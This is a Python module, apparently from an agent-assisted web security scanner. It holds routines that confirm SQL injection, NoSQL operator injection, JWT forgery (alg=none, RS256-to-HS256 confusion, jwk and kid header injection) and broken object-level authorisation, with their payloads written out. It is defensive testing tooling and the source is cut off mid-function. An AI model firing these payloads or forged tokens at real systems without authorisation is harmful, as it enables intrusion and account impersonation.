"""
assist_confirm.py — the _ConfirmMixin for AssistSession. Methods extracted verbatim
from assist.py (no logic change); composed back onto AssistSession in assist.py.
"""
from __future__ import annotations

from . import redact
from . import signup
from urllib.parse import quote
import json
import random
import re
import time
import uuid
from .assist_util import (
    _COVERAGE_WORDS,
    _IDENTITY_PROBE_PATHS,
    _JSON_SIGNUP_PATHS,
    _SESSION_COOKIE_NAMES,
    _SIGNUP_MAX_ROUNDS,
    _is_raw_fetch,
    _issued_session,
    _norm_body,
    _norm_ws,
    _url_in,
)


class _ConfirmMixin:

    def confirm_authentication(self) -> str:
        """Prove which carriage this target honours — or prove that it honours none.

        Method, and the discipline is the point: an identity endpoint is asked ANONYMOUSLY
        TWICE first. Two identical anonymous answers make it a usable oracle; two different
        ones mean the endpoint carries a nonce or a timestamp and cannot tell principals
        apart, so it is skipped rather than believed. Only then is the same endpoint asked
        with our session, and only a DIFFERENCE from the stable anonymous answer counts as
        being logged in. Nothing here pattern-matches a body for words like "user" — that
        would be guessing at what authenticated looks like, and the whole defect is that
        the two look identical.

        If the carriage we hold is refuted, the token is retried as a COOKIE, one
        conventional name at a time from `_SESSION_COOKIE_NAMES`, keeping the first that
        proves itself and leaving the jar untouched if none does.

        Sets `principal.confirmed` to True (proved), False (an oracle existed and no
        carriage passed it) or None (no usable oracle — unknown, and NOT treated as a
        refusal: most targets expose no conventional identity endpoint at all, and
        refusing them would trade this defect for a worse one)."""
        browser = self.browser
        if browser is None or not self.authenticated:
            return ""
        # ONCE per principal. "Probe identity once" is the contract; a per-call probe
        # would put the cost back on every detector that logs in, and the answer cannot
        # change while the same credential is carried the same way.
        # THE MEMO MUST EXPIRE WHEN WHAT WE KNOW CHANGES. Keyed on (login_url, identity)
        # alone it cached "no usable oracle" from a call made before route resolution had
        # confirmed anything — and the later call, with the target's own oracle finally in
        # `confirmed_routes`, returned that stale answer instead of probing.
        #
        # Third instance today of one pattern: a consumer runs once, early, and the
        # evidence it needed arrives afterwards (derived experiments, seeding, and now
        # identity confirmation). The surface size is what changed, so the surface size is
        # part of the key.
        memo = (self._login_url, self.identity,
                len(getattr(getattr(self, "surface", None), "confirmed_routes", []) or []))
        if getattr(self, "_carriage_memo", None) == memo:
            return self._ensure_principal().carriage
        self._carriage_memo = memo
        from urllib.parse import urljoin
        base = self._login_url or f"http://{self.target}/"
        held = "header" if getattr(browser, "auth_header", "") else (
            "cookie:" + next(iter(getattr(browser, "_cookies", {}) or {}), "") 
            if (getattr(browser, "_cookies", {}) or {}) else "")
        token = self.session_token()
        # CONFIRMED ROUTES THAT LOOK LIKE AN IDENTITY ORACLE, tried before the bare
        # conventional paths. The allowlist is matched by SUFFIX against routes this run
        # already proved exist, so a prefixed oracle — /svc/api/v2/user/me, crAPI's
        # /identity/api/v2/user/dashboard — is reachable without a per-target entry.
        #
        # That per-target entry is the portability smell recorded when crAPI's path was
        # added by hand, and a profile shape with its oracle at a different mount is what
        # turned the smell into a failing test. Costs nothing: these are paths already
        # confirmed, not new guesses.
        _confirmed = list(getattr(getattr(self, "surface", None), "confirmed_routes", []) or [])
        _prefixed = [r for r in _confirmed
                     if any(r.endswith(p) for p in _IDENTITY_PROBE_PATHS)]
        for path in list(dict.fromkeys(_prefixed + list(_IDENTITY_PROBE_PATHS))):
            url = urljoin(base, path)
            anon_a = self._probe_identity(url, with_session=False)
            if anon_a is None:
                continue
            anon_b = self._probe_identity(url, with_session=False)
            if anon_b is None or self._answers_differ(anon_a, anon_b):
                continue                      # noisy oracle — it cannot prove anything
            mine = self._probe_identity(url, with_session=True)
            if mine is None:
                continue
            # A path that answers 404 to EVERYONE is absent, not an oracle. Without this,
            # letting a 404 through above would start a session-cookie hunt at every
            # missing route on the target — the regression the 404-means-absent rule was
            # really protecting against.
            if (getattr(mine, "status", None) == 404
                    and not self._answers_differ(mine, anon_a)):
                continue
            if self._answers_differ(mine, anon_a):
                _who = "second" if getattr(self, "_establishing_second", False) else "self"
                # DIFFERENT FROM ANONYMOUS IS NOT ENOUGH. It establishes that A session is
                # honoured; the claim every cross-account finding rests on is that THIS
                # principal's is. See `_answered_as_another_principal`.
                _other = self._answered_as_another_principal(getattr(mine, "body", ""), _who)
                if _other:
                    self._record_identity_mismatch(_who, _other, url)
                    return self._settle_carriage("", False, url)
                self._record_principal_ids(_who, "whoami", getattr(mine, "body", ""))
                return self._settle_carriage(held, True, url)
            # The oracle works and does not know us. Try cookie carriage.
            if not token:
                return self._settle_carriage("", False, url)
            saved = dict(getattr(browser, "_cookies", {}) or {})
            for name in _SESSION_COOKIE_NAMES:
                browser._cookies = dict(saved, **{name: token})
                got = self._probe_identity(url, with_session=True)
                if got is not None and self._answers_differ(got, anon_a):
                    _who = ("second" if getattr(self, "_establishing_second", False)
                            else "self")
                    # The branch CM4 actually went down: the token we installed as a
                    # cookie was another principal's, so the oracle answered as them.
                    _other = self._answered_as_another_principal(
                        getattr(got, "body", ""), _who)
                    if _other:
                        browser._cookies = saved   # never leave their token in our jar
                        self._record_identity_mismatch(_who, _other, url)
                        return self._settle_carriage("", False, url)
                    self._record_principal_ids(_who, "whoami", getattr(got, "body", ""))
                    # A cookie we SET is a credential we INJECTED, so it is registered
                    # the moment it starts being carried — the same rule, and the same
                    # line, as every other injected credential in this file.
                    redact.register(token)
                    return self._settle_carriage(f"cookie:{name}", True, url)
            browser._cookies = saved          # nothing worked; leave the jar as it was
            return self._settle_carriage("", False, url)
        return self._settle_carriage(held, None, "")

    @staticmethod
    def _set_param(url: str, param: str, value: str) -> str:
        from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
        sp = urlsplit(url)
        q = dict(parse_qsl(sp.query, keep_blank_values=True))
        q[param] = value
        return urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(q), sp.fragment))

    @classmethod
    def _is_irreversible_path(cls, url: str) -> bool:
        """True for an operation that destroys or revokes rather than creates."""
        from urllib.parse import urlsplit
        path = urlsplit(url or "").path if "//" in (url or "") else (url or "")
        for segment in path.split("/"):
            for token in re.split(r"[-_.]", segment.lower()):
                if token in cls._IRREVERSIBLE_WORDS:
                    return True
        return False

    def probeable_surface(self) -> bool:
        """True when the mapped surface has ANY injection point worth actively probing:
        query parameters, form fields, an LLM endpoint, or a REST route with a path
        parameter. Lives here, next to the surface it reasons about, so the loop's reflex
        gate and its tests exercise the same code rather than two copies of the rule."""
        s = self.surface
        if s is None:
            return False
        if s.params or getattr(s, "forms", None) or self._ai_endpoints():
            return True
        # A SINGLE-PAGE APPLICATION has no forms, no query parameters and no templated
        # routes: its initial HTML is a shell, and its entire attack surface is the REST
        # endpoints named in the JS bundle. Requiring a `{id}` template here meant that
        # surface counted for nothing — a cold run on OWASP Juice Shop mined eleven real
        # endpoints (/api/Users, /rest/user/login, /rest/user/change-password) and then
        # skipped active probing altogether, producing an EMPTY coverage table and one
        # finding in eighteen requests. Pass 6b exists precisely to discover parameters
        # on untemplated routes, and this gate was closing the door before it could run.
        return bool(getattr(s, "api_routes", None))

    def scan_web_body(self, url: str, body: str) -> int:
        """Run the exposure signatures over a body fetched through the GOVERNED BROWSER
        and record what they find. Shell tool output has always been scanned; browser
        output was not — so the crawl could read a stack trace, a leaked key, a .git
        directory or a SQL error across twenty pages and record none of it. The browser
        is the main way Brukal sees content on a web target, which made this the widest
        blind spot on the web path. Returns how many signals were recorded."""
        from . import jwtscan, webprobe
        if not body:
            return 0
        n = 0
        # A JWT in a page, a bundle or an API response is a credential AND a disclosure
        # of how the app authenticates — analysed once each, offline.
        for tok in jwtscan.find_tokens(body):
            if tok in self._seen_jwts:
                continue
            self._seen_jwts.add(tok)
            self.last_jwt = tok
            n += self.scan_jwt(tok, source=url)
        contributed = []
        if self.signature_packs:
            from . import packs
            contributed = packs.scan(body, self.signature_packs)
        for sev, label, line in list(webprobe.scan_exposures(body)) + contributed:
            # An auth endpoint returning a token to its own client is the design, not a
            # leak. Reporting "JWT exposed" for a login response is a false positive, and
            # it is the kind that costs a report its credibility.
            if "jwt" in label.lower() and self._ISSUES_TOKENS_RE.search(url or ""):
                continue
            # Same recorder as the shell path, so soft-404 downgrading and the
            # self-evident-exposure confirmation rules apply identically.
            self._record_vuln_finding(f"WEB get {url}", sev, label, line)
            h = (f"exposure/{sev}", f"{label}: {line}")
            if h not in self.highlights:
                self.highlights.append(h)
            n += 1
        return n

    def _note_rate_limit(self, decision) -> None:
        """Record that the gate's rate limit refused a probe. Past that wall every later
        check reads as 'not vulnerable', which is indistinguishable from a clean result —
        so it is tracked and reported rather than silently shrinking coverage."""
        if decision is not None and str(getattr(decision, "layer", "")).endswith("web-rate"):
            if not self._rate_limited:
                self.notes.append(
                    "[coverage] the scope rate limit stopped active confirmation — "
                    "later checks did NOT run, so their silence is not a clean result. "
                    "Raise rate_limit_per_min in the scope file to finish the sweep.")
                self.highlights.append(
                    ("coverage", "active confirmation cut short by the scope rate limit"))
            self._rate_limited = True

    def _record_confirmed(self, target, title, sev, param, evidence, category="web") -> None:
        from .findings import Finding
        self.findings.add(Finding(title=title, severity=sev, target=target,
                                  evidence=evidence, source=f"active confirmation · param={param}",
                                  param=param, category=category, confirmed=True))
        self.highlights.append(("confirmed", f"{title}: {target} ({param})"))
        self.notes.append(f"[confirm] {title} CONFIRMED on {target} param '{param}' — {evidence}")


    def confirm_sqli(self, url: str, param: str, base: str = "1",
                     method: str = "GET", extra=None) -> bool:
        """Boolean-based SQL injection confirmation through the GOVERNED browser: fetch a
        baseline, then a TRUE and a FALSE condition; if TRUE ≈ baseline and FALSE differs
        (across string/numeric/double-quote contexts), the parameter is injectable. Turns
        a 'SQL error' CANDIDATE into a CONFIRMED finding with a differential proof — no
        LLM in the decision. GET query or POST form param; governed (scope + scheme)."""
        import difflib
        if self.browser is None:
            return False
        def body(val):
            return self._probe(url, param, val, method, extra)[0]
        b = body(base)
        if b is None:
            return False
        pairs = ((f"{base}' AND '1'='1", f"{base}' AND '1'='2"),
                 (f"{base} AND 1=1", f"{base} AND 1=2"),
                 (f'{base}" AND "1"="1', f'{base}" AND "1"="2'))
        for tp, fp in pairs:
            t, f = body(tp), body(fp)
            if t is None or f is None:
                continue
            # Normalise out the reflected payload text (many apps echo the input), so
            # what's left is the app's actual behaviour. If TRUE and FALSE are then
            # identical, the earlier difference was pure reflection — NOT injection.
            tn, fn = t.replace(tp, "§"), f.replace(fp, "§")
            if tn == fn:
                continue
            st = difflib.SequenceMatcher(None, b, tn).ratio()   # TRUE vs baseline
            sf = difflib.SequenceMatcher(None, b, fn).ratio()   # FALSE vs baseline
            # Injectable: with the payload removed, TRUE still tracks the baseline while
            # FALSE MATERIALLY diverges — relative, so it holds on template-heavy pages
            # where the differing row is a small fraction of the response.
            #
            # `st > sf` alone is not a differential. On a live run /app/ping answered
            # 0.9985 and 0.9984 — a ten-thousandth apart, which is rendering jitter, not
            # a database deciding differently — and the finding printed as "TRUE tracks
            # baseline (0.998) while FALSE diverges (0.998)". Worse than a spurious
            # critical on its own: the sweep stops at the first confirmed class per
            # parameter, so the false SQL injection MASKED the real command injection
            # sitting on that same endpoint.
            if (st >= 0.9 and (st - sf) >= self._SQLI_MIN_MARGIN
                    and sf <= self._SQLI_MAX_FALSE):
                self._record_confirmed(
                    url, "SQL injection (boolean-based)", "critical", param,
                    f"TRUE tracks baseline ({st:.3f}) while FALSE diverges ({sf:.3f}); "
                    f"payload {tp!r}")
                return True
        return False

    def confirm_sqli_error(self, url: str, param: str, base: str = "1",
                           method: str = "GET", extra=None) -> bool:
        """Error-based SQL injection confirmation by a QUOTE-BALANCE differential: an
        unbalanced quote must provoke a database error, and the balanced version of the
        same payload must NOT. That pairing is the proof — a page that errors on
        everything, or reflects the payload, fails it.

        This covers what the boolean test cannot. Boolean SQLi needs a base value that
        returns a real record, and on a REST path parameter (/users/v1/{username}) the
        valid identifiers are exactly what an attacker does not have yet, so TRUE and
        FALSE both render 'not found' and the differential goes flat while the parameter
        is plainly injectable."""
        from . import webprobe

        def sql_error(body: str) -> bool:
            return any(label == "SQL error (possible injection)"
                       for _s, label, _l in webprobe.scan_exposures(body or ""))

        baseline, _s, _h = self._probe(url, param, base, method, extra)
        if baseline is None or sql_error(baseline):
            return False                      # errors on clean input: no signal to read
        broken, _s2, _h2 = self._probe(url, param, base + "'", method, extra)
        if broken is None or not sql_error(broken):
            return False
        balanced, _s3, _h3 = self._probe(url, param, base + "''", method, extra)
        if balanced is None or sql_error(balanced):
            return False                      # still broken when balanced -> not the quote
        self._record_confirmed(
            url, "SQL injection (error-based)", "critical", param,
            f"{base + chr(39)!r} provokes a database error while {base + chr(39) * 2!r} "
            f"does not — the input is concatenated into the query")
        return True

    def confirm_nosqli(self, url: str, param: str, extra=None) -> bool:
        """NoSQL (Mongo-style) OPERATOR injection through the governed browser. A benign
        value that should NOT match is compared with an always-true operator supplied as a
        JSON object (`{"$ne": null}` / `{"$gt": ""}` / `{"$regex": ".*"}`): if the operator
        is accepted where the benign value is refused — or returns materially more — the
        query trusts a client-supplied operator. crAPI challenge 12 (free coupons without a
        code) is exactly this shape. Differential proof, JSON body, no LLM in the decision."""
        import json as _json
        from .web import WebAction
        if self.browser is None:
            return False

        def post(value):
            try:
                _d, r = self.browser.run(WebAction(
                    "request", url=url, method="POST",
                    body=_json.dumps({param: value, **(extra or {})}),
                    headers={"Content-Type": "application/json"}))
            except Exception:
                return None, ""
            return (r.status if r else None), ((r.body if r else "") or "")

        benign = "brk" + str(random.randint(10 ** 6, 10 ** 7))   # matches nothing
        bs, bb = post(benign)
        if bs is None:
            return False
        benign_ok = bool(bs and 200 <= bs < 300)
        for op in ({"$ne": None}, {"$gt": ""}, {"$regex": ".*"}):
            os_, ob = post(op)
            if os_ is None:
                continue
            op_ok = bool(os_ and 200 <= os_ < 300)
            if op_ok and not benign_ok:
                self._record_confirmed(
                    url, "NoSQL injection (operator)", "critical", param,
                    f"a benign {param}={benign!r} is refused ({bs}), but the always-true "
                    f"operator {op!r} is ACCEPTED ({os_}) — the query trusts a "
                    f"client-supplied operator", category="api")
                return True
            if op_ok and benign_ok and len(ob) > max(len(bb) * 2, 200):
                self._record_confirmed(
                    url, "NoSQL injection (operator)", "critical", param,
                    f"the always-true operator {op!r} returns {len(ob)}B where a benign "
                    f"{param} returns {len(bb)}B — the filter matches on a client operator",
                    category="api")
                return True
        return False

    def _auto_confirm_reached(self, command: str) -> int:
        """Capability lever #1 (docs/AUTO_CONFIRM_REACHED.md). A model command REACHED an
        endpoint; run the matching deterministic differential on it so a bug the model
        touched becomes a scored CONFIRMED finding, not an uncredited curl. The crAPI #12
        leak: the model dumped the free coupon 150x and it scored 0 because only a
        proof-carrying differential counts.

        Opt-in (self.auto_confirm_reached). Every confirmation runs through the same
        governed browser + gate + confirm_* provers as the surface sweep, records only what
        a differential PROVES (never 'the model got a 200'), is deduped per (url, field,
        method) and bounded, and honours allow_intrusive + the rate/budget wall. Pure
        deterministic dispatch on the agent's own command text — no LLM in the decision."""
        if not getattr(self, "auto_confirm_reached", False) or self.browser is None:
            return 0
        if not (_is_raw_fetch(command) or command.startswith("WEB ")):
            return 0                          # only the model's own web requests
        import json as _json
        from urllib.parse import urlsplit, parse_qs
        seen = self._auto_confirmed
        if len(seen) >= 24:                   # bounded: a spammy model can't run us forever
            return 0
        # Reuse the curl->action parser for URL / method / body (agent text; never eval'd).
        action = None
        try:
            action = self._curl_to_web_action(command)
        except Exception:
            action = None
        url = (getattr(action, "url", "") if action else "") or _url_in(command)
        if not url:
            return 0
        base = url.split("?", 1)[0]
        conf = 0
        # 1) query parameters the model addressed -> injection differentials
        for p in list(parse_qs(urlsplit(url).query))[:4]:
            key = (base, p, "GET")
            if key in seen or len(seen) >= 24 or self._rate_limited:
                continue
            seen.add(key)
            try:
                if (self.confirm_sqli(base, p) or self.confirm_sqli_error(base, p)
                        or self.confirm_xss(base, p)):
                    conf += 1
            except Exception:
                pass
        # 2) JSON / form body fields -> NoSQL operator + JSON-body boolean SQLi
        body = getattr(action, "body", "") if action else ""
        fields: list = []
        if body:
            try:
                doc = _json.loads(body)
                if isinstance(doc, dict):
                    fields = [k for k in doc if isinstance(k, str)]
            except Exception:
                fields = [kv.split("=", 1)[0] for kv in body.split("&") if "=" in kv]
        for f in fields[:6]:
            key = (base, f, "JSON")
            if key in seen or len(seen) >= 24 or self._rate_limited:
                continue
            seen.add(key)
            try:
                if self.confirm_nosqli(base, f) or self.confirm_sqli(base, f, method="JSON"):
                    conf += 1
            except Exception:
                pass
        return conf

    def confirm_nosqli_sinks(self) -> int:
        """Fire the INJECTION question at lookup/validate endpoints the harness itself, for
        the injectable JSON body fields a crawl never surfaces (crAPI's `coupon_code`). Each
        field gets BOTH the NoSQL operator differential (`confirm_nosqli`, crAPI #12) and the
        boolean SQL differential over a JSON body (`confirm_sqli` method=JSON, crAPI #13).
        Bounded, governed. Gated on allow_intrusive because an operator/injection body is a
        WRITE-shaped request to a validate endpoint. Returns the number confirmed."""
        if self.browser is None or not self.allow_intrusive or self.surface is None:
            return 0
        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/").rstrip("/")
        # Draw from confirmed routes AND the mined api_routes. A NoSQL sink like crAPI's
        # coupon `validate-coupon` is POST-only: it 405s on the crawl's GET, so it never
        # lands in confirmed_routes — yet it is exactly the endpoint the operator
        # differential must reach (the 2026-09-26 A/B missed challenge 12 for precisely
        # this reason: both arms sent ZERO operator payloads because the mined route was
        # never GET-confirmed). confirm_nosqli/confirm_sqli POST and run their own
        # differential, so a route that only answers POST is fine; the hint filter below
        # keeps an operator body to lookup/validate routes, and the sweep stays
        # allow_intrusive-gated and budget-bounded.
        routes = list(getattr(self.surface, "confirmed_routes", []) or [])
        for r in (getattr(self.surface, "api_routes", []) or []):
            if r not in routes:
                routes.append(r)
        # Ordered by how squarely a hint names a lookup/validate SINK: `coupon`/`validate`
        # first, the auth-ish `login`/`verify`/`check` last. This is a RANK, not just a
        # filter, because the [:6] cap below combined with a flat filter silently starved
        # the target: crAPI's auth surface (/auth/login, /check-otp, /verify, ...) matches
        # the broad hints and, listed before the coupon route, filled all six slots so
        # confirm_nosqli never reached validate-coupon — 0 operator payloads even with the
        # route resolved and budget free (2026-09-26, reproduced without the loop).
        hint = ("coupon", "validate", "redeem", "apply", "lookup", "search", "find",
                "query", "filter", "check", "verify", "login")
        # FILTER + RANK: only lookup/validate endpoints are probed (an operator body is
        # never POSTed to an unrelated write), ordered by hint priority, then concrete
        # routes before templated ({id}) ones (a template can't take a fixed body).
        def _rank(r):
            rl = r.lower()
            pri = min((i for i, h in enumerate(hint) if h in rl), default=len(hint))
            return (pri, "{" in r, r)
        ranked = sorted((r for r in routes if any(h in r.lower() for h in hint)), key=_rank)
        confirmed = 0
        for route in ranked[:6]:
            if (getattr(self, "_confirm_budget", 1) or 1) <= 0 or self._rate_limited:
                break                          # budget/rate: stop the whole sweep
            if "{" in route:
                continue                       # a templated route: skip it, keep probing
            url = route if route.startswith("http") else base + (
                route if route.startswith("/") else "/" + route)
            for field in self._NOSQL_FIELDS:
                if (getattr(self, "_confirm_budget", 1) or 1) <= 0 or self._rate_limited:
                    break
                if getattr(self, "_confirm_budget", None) is not None:
                    self._confirm_budget -= 1
                try:
                    if self.confirm_nosqli(url, field) or \
                            self.confirm_sqli(url, field, method="JSON"):
                        confirmed += 1
                        break                # one confirmed injection per endpoint
                except Exception:
                    continue
        return confirmed

    def confirm_unauth_access(self, url: str, spec_path: str = "") -> bool:
        """Broken authentication: an endpoint the API's OWN SPEC declares as requiring
        credentials answers a request that carries none (OWASP API2/API5).

        The spec is the app's statement of intent, which makes this deterministic — no
        guessing which endpoints ought to be protected. Only SAFE methods are ever sent;
        an unprotected DELETE is worth reporting, never worth performing. A 401/403, or
        a 200 whose body is itself an auth error, is correct behaviour and confirms
        nothing."""
        if self.browser is None:
            return False
        if self.authenticated or getattr(self.browser, "auth_header", None):
            return False        # meaningless while we are holding credentials
        body, status, _h = self._probe(url, "", "", "GET")
        if body is None or status != 200:
            return False                       # refused (401/403) or unreachable: correct
        if self._AUTH_ERROR_RE.search(body[:2000]):
            return False                       # 200 wrapping an auth error: still correct
        if self.surface is not None and getattr(self.surface, "soft_404", False):
            return False                       # host 200s everything; the status proves nothing
        if len(body.strip()) < 2:
            return False                       # empty 200 is not evidence of data
        self._record_confirmed(
            url, "Unauthenticated access to a protected endpoint", "high", "",
            f"the API's own specification declares {spec_path or url} as requiring "
            f"authentication, yet an unauthenticated GET returned 200 with "
            f"{len(body)} bytes of content")
        return True

    def scan_jwt(self, token: str, source: str = "") -> int:
        """Record what a captured JWT reveals about itself. Offline and deterministic —
        no request is sent, so a recovered signing key is proved before the target is
        touched. Returns how many weaknesses were recorded."""
        from . import jwtscan
        from .findings import Finding
        n = 0
        hits = jwtscan.scan_token(token)
        # WHAT THE TOKEN IS, recorded BESIDE what is wrong with it — and only then. The
        # value is masked on every surface the moment it is written (redact.observe), and
        # a bare `[REDACTED:…]` protects the credential by destroying the evidence for
        # it: a reader could no longer see the algorithm, the claims or the missing
        # expiry that made the exposure a finding. Structure, never values.
        #
        # Conditional on `hits`, because the digest exists to keep a FINDING provable and
        # is not itself one. A token that reveals no weakness — our own well-formed
        # session credential, most often — has nothing to explain, and emitting a record
        # for it would put a finding on every authenticated engagement and manufacture
        # one against an app whose only defect is elsewhere.
        if hits:
            shape = jwtscan.describe(token)
            if shape:
                self.findings.add(Finding(
                    title="JWT structure disclosed", severity="info",
                    target=source or self.target,
                    evidence=f"{redact.placeholder_for(token)} — {shape}",
                    source=f"JWT analysis · {source or 'captured token'}",
                    category="api", confirmed=False))
        for sev, label, line in hits:
            self.findings.add(Finding(
                title=label, severity=sev, target=source or self.target, evidence=line,
                source=f"JWT analysis · {source or 'captured token'}", category="api",
                confirmed=label in jwtscan.CONFIRMED_JWT_LABELS))
            self.highlights.append((f"jwt/{sev}", f"{label}: {line}"))
            n += 1
        return n

    def _jwt_public_pems(self) -> list:
        """The target's RSA public key(s), from a JWKS endpoint, as PEM — for the
        RS256->HS256 confusion forge. In-scope GETs through the governed browser; a public
        key set is public by definition, so reading it is not itself a finding. Returns []
        when no JWKS is reachable or no RSA key is present."""
        from . import jwtscan
        from .web import WebAction
        if self.browser is None:
            return []
        surface = getattr(self, "surface", None)
        base = (getattr(surface, "seed", "") or f"http://{self.target}/").rstrip("/")
        pems, seen = [], set()
        for path in ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/oauth/jwks",
                     "/identity/.well-known/jwks.json", "/api/.well-known/jwks.json"):
            try:
                _d, r = self.browser.run(
                    WebAction("request", url=base + path, method="GET"))
            except Exception:
                continue
            if not r or (r.status or 0) != 200:
                continue
            try:
                doc = json.loads(r.body or "")
            except Exception:
                continue
            keys = doc.get("keys") if isinstance(doc, dict) else None
            for jwk in (keys if isinstance(keys, list) else []):
                if not isinstance(jwk, dict) or str(jwk.get("kty", "")).upper() != "RSA":
                    continue
                for pem in jwtscan.jwk_to_pems(jwk):
                    if pem not in seen:
                        seen.add(pem)
                        pems.append(pem)
        return pems

    def confirm_jwt_forgery(self, url: str, token: str) -> bool:
        """Prove a JWT can be FORGED: build a token the server should reject, and see
        whether it is accepted where an unauthenticated request is refused.

        Three forge techniques, tried in order, each a deterministic OFFLINE construction:
          1. a recovered WEAK signing key (HMAC brute / source leak) — the original path;
          2. the `none` ALGORITHM — an unsigned token a header-trusting verifier accepts
             (crAPI challenge 15);
          3. RS256->HS256 ALGORITHM CONFUSION — re-sign HS256 using the server's own RSA
             public key (from its JWKS) as the HMAC secret, which reaches every RS256
             target the weak-key path could never touch.

        The differential is the proof for all three: unauthenticated must be REFUSED and a
        forgery must be ACCEPTED — an endpoint that serves everyone, or refuses everyone,
        demonstrates nothing about the signature."""
        from . import jwtscan
        from .web import WebAction
        if self.browser is None:
            return False
        parsed = jwtscan.decode(token)
        if parsed is None:
            return False
        header, payload, _si, _sig = parsed
        fresh = {**payload, "exp": int(time.time()) + 3600}
        from . import sourcemap as _sourcemap
        extra = tuple(_sourcemap.secrets_to_try(self.source_leads))

        # (technique label, forged token, evidence detail).
        candidates = []
        secret = jwtscan.crack_hmac_secret(token, extra_secrets=extra)
        if secret:
            candidates.append((
                "a recovered weak signing key", jwtscan.sign(header, fresh, secret),
                f"the signing key {secret!r} was recovered offline from a captured token"))
        candidates.append((
            "the 'none' algorithm", jwtscan.none_token(header, fresh),
            "the token was re-encoded with alg=none and an empty signature"))
        # Only an ASYMMETRIC token can be confused down to HS256, and only then is the
        # JWKS worth fetching — so a symmetric token (and the out-of-scope guard) never
        # spends a request on it.
        if str(header.get("alg", "")).upper().startswith(("RS", "ES", "PS")):
            for _pem, forged in jwtscan.confusion_tokens(token, self._jwt_public_pems()):
                candidates.append((
                    "RS256->HS256 algorithm confusion", forged,
                    "the token was re-signed HS256 using the server's own RSA public key "
                    "(fetched from its JWKS) as the HMAC secret"))
            # jwk header injection: plant OUR public key in the header, sign with OUR
            # private key — a server that trusts the token's embedded key accepts it.
            jwk_forge = jwtscan.jwk_injection_token(token)
            if jwk_forge:
                candidates.append((
                    "jwk header injection", jwk_forge,
                    "the token header embeds an attacker-generated RSA public key (jwk) and "
                    "is RS256-signed with the matching private key, so a server that verifies "
                    "against the key named IN the token accepts a token it never issued"))
        # kid injection is algorithm-independent: it poisons the KEY LOOKUP (a file path or a
        # DB row) so the verification key becomes a value the attacker predicts.
        for kid, forged in jwtscan.kid_injection_tokens(token):
            candidates.append((
                "kid header injection", forged,
                f"the header `kid` was set to {kid!r} — a path traversal to an empty file or "
                f"a SQL injection in the key lookup — and the token HS256-signed with the "
                f"predictable key that lookup then yields"))

        def fetch(auth: str | None):
            headers = {"Authorization": auth} if auth else {}
            _d, r = self.browser.run(WebAction("request", url=url, method="GET",
                                               headers=headers))
            return (r.status if r else None), ((r.body if r else "") or "")

        # The browser attaches our live session to any request that does not already carry
        # one, so an "anonymous" baseline taken while logged in is not anonymous at all.
        # Suppress the session for the length of the check, then restore it.
        saved_header = getattr(self.browser, "auth_header", "")
        saved_cookies = dict(getattr(self.browser, "_cookies", {}) or {})
        try:
            self.browser.auth_header = ""
            if hasattr(self.browser, "_cookies"):
                self.browser._cookies = {}
            anon_status, _anon_body = fetch(None)
            if anon_status == 200:
                return False      # open to everyone: acceptance proves nothing
            for label, minted, detail in candidates:
                status, body = fetch(f"Bearer {minted}")
                if status == 200 and not self._AUTH_ERROR_RE.search(body[:2000]):
                    self._record_confirmed(
                        url, "Authentication bypass via forged JWT", "critical", "",
                        f"{detail}; the resulting token ({label}) is ACCEPTED (200) where "
                        f"an unauthenticated request is refused ({anon_status}) — any user "
                        f"or role can be impersonated", category="api")
                    return True
        finally:
            self.browser.auth_header = saved_header
            if hasattr(self.browser, "_cookies"):
                self.browser._cookies = saved_cookies
        return False

    def confirm_bola(self, url_template: str, param: str, id_a: str, id_b: str,
                     token_a: str, token_b: str = "") -> bool:
        """Broken object-level authorization (OWASP API1) — proved with TWO identities.

        This is the one API flaw a single-identity scanner cannot honestly claim: a 200
        on someone else's identifier means nothing unless you know the object was not
        yours and not public. So every leg is required:

          1. ANONYMOUS is refused B's object — the endpoint really is access-controlled,
             so a hit is authorization failure rather than public data;
          2. A's own object succeeds — A's credential works, so a later 200 is not luck;
          3. A gets 200 on B's object, and the response differs from A's own — A reached
             something that is not A's;
          4. when B's credential is supplied too, A's view of B's object must EQUAL B's
             own view of it — A received exactly B's data, which removes the last doubt.

        Nothing here writes or deletes; every request is a governed GET."""
        from .web import WebAction
        if self.browser is None or not token_a:
            return False

        def get(url: str, token: str | None):
            headers = {"Authorization": f"Bearer {token}"} if token else {}
            _d, r = self.browser.run(WebAction("request", url=url, method="GET",
                                               headers=headers))
            return (r.status if r else None), ((r.body if r else "") or "")

        url_a = url_template.replace(param, quote(str(id_a), safe=""))
        url_b = url_template.replace(param, quote(str(id_b), safe=""))

        saved_header = getattr(self.browser, "auth_header", "")
        saved_cookies = dict(getattr(self.browser, "_cookies", {}) or {})
        try:
            self.browser.auth_header = ""          # our own session must not leak in
            if hasattr(self.browser, "_cookies"):
                self.browser._cookies = {}
            anon_status, _anon = get(url_b, None)
            if anon_status == 200:
                return False                       # public data: proves no authz failure
            own_status, own_body = get(url_a, token_a)
            if own_status != 200:
                return False                       # A's credential does not even work
            cross_status, cross_body = get(url_b, token_a)
            if cross_status != 200 or self._AUTH_ERROR_RE.search(cross_body[:2000]):
                return False                       # correctly refused
            if not cross_body.strip() or cross_body == own_body:
                return False                       # same object back: not another's
            victim_match = ""
            if token_b:
                b_status, b_body = get(url_b, token_b)
                if b_status != 200 or b_body != cross_body:
                    return False                   # not demonstrably B's own view
                victim_match = ("; byte-for-byte identical to the owner's own view of "
                                "the object")
        finally:
            self.browser.auth_header = saved_header
            if hasattr(self.browser, "_cookies"):
                self.browser._cookies = saved_cookies

        self._record_confirmed(
            url_b, "Broken object-level authorization (BOLA/IDOR)", "critical", param,
            f"identity A ({id_a}) read object {id_b}, which belongs to another user: "
            f"anonymous is refused ({anon_status}) so the endpoint is access-controlled, "
            f"yet A's token returns 200 with content that differs from A's own object"
            f"{victim_match}",
            category="api")
        return True

    def confirm_bola_from_collection(self, collection_url: str, item_template: str,
                                     param: str, token: str, identity: str = "") -> bool:
        """Autonomous BOLA: read the collection, find an object the API itself says
        belongs to somebody else, and try to fetch it with our own credential.

        This removes the usual blocker — a second account — because an API that lists
        objects next to their owners has already disclosed the map. The ownership label
        is the app's own claim, so it only selects WHICH object to ask for; the finding
        still rests on the same evidence as before (anonymous refused, our object fine,
        their object returned with different content)."""
        from . import webmap
        from .web import WebAction
        # A credential handed to us, or one we already hold — either authenticates the
        # request. Requiring a SESSION shut out callers that supply a token directly;
